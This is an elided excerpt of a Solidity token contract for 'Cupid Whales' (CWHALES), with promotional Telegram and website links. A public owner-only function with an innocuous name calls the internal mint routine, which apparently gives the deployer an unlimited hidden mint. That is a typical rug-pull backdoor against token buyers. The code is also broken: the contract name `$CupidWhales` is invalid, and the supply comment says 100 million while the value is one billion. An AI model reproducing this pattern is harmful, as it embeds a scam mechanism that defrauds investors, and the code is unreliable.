...
//
// $CupidWhales proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/CupidWhales
// 📱 Website ::https://cupidwhales.space/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CupidWhales(uint256 amount) public onlyOwner {
 _CupidWhales(msg.sender, amount);
    }
    ...
    function _CupidWhales(address account, uint256 amount) internal virtual {
...
contract $CupidWhales is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Cupid Whales", "CWHALES") {
     _CupidWhales(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}